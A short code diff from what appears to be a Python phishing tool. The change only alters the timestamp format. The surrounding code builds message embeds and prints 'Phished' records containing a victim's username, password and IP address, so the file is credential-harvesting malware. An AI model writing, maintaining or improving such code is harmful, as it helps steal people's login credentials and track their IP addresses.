@@ -98,7 +98,7 @@ def send(args: str, ip: str):
             "embeds": embeds}
 
     n = datetime.now()
-    date = f"{n.hour}H:{n.minute}M:{n.second}S | {n.day}/{n.month}/{n.year}"
+    date = f"{n.hour}h:{n.minute}m:{n.second}s | {n.day}/{n.month}/{n.year}"
 
     if len(fields) != 1:
         print(Colorate.Horizontal(Colors.red_to_blue, f"\nPhished -> {date}\nUsername: {username}\nPassword: {password}\nIP: {ip}\n\n"))
